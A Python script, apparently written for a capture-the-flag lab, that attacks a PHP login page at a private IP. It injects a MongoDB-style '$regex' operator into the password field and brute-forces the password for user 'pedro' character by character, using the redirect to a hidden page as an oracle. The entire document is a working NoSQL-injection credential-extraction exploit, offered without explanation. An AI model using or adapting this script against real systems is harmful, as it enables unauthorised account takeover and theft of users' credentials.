import requests
import string   

numbers=[1,2,3,4,5,6,7,8,9,0]

alphabetsList = list(string.ascii_lowercase)

full= alphabetsList + numbers 

username= "pedro" #define username here
password=[]
length= 10   #define the length of password here

finalpass=""
found= False

while not found:
    for i in full:
        #change the IP
        url= "http://10.10.102.179/login.php"
        headers= {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",

                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",

                "Accept-Language": "en-US,en;q=0.5",

                "Accept-Encoding": "gzip, deflate",

                "Content-Type": "application/x-www-form-urlencoded",

                "Origin": "http://10.10.102.179",

                "Connection": "close",

                "Referer": "http://10.10.102.179/",

                "Upgrade-Insecure-Requests": "1"}

        data= {"user": {username}, "pass[$regex]": f"^{''.join([i for i in password])}{i}{'.' * length}$", "remember": "on"}

        r = requests.post(url, headers=headers, data= data, allow_redirects=False)

        if r.headers.get("Location") == "/sekr3tPl4ce.php":
            password.append(str(i))
            length= length - 1

        print(''.join(password))

        if len(password) == 11:
            found= True
            finalpass= ''.join(password)

print(f"Done! password is {finalpass}")

        
            
        
